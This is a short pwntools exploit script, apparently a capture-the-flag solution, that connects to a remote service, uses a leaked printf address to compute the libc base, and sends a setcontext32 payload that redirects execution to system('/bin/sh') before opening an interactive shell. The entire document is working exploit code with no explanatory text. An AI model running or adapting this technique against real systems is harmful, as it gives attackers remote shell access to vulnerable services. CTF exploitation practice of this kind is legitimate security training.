from pwn import *
from setcontext32 import *

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
#conn = elf.process()
conn = remote("34.34.46.244", 1337)

conn.recvuntil(b"0x")
libc.address = int(conn.recv(12), 16) - libc.sym.printf
info("libc @ " + hex(libc.address))

dest, pl = setcontext32(
             libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
           )

conn.sendline(hex(dest).encode())
conn.sendline(pl)

conn.interactive()
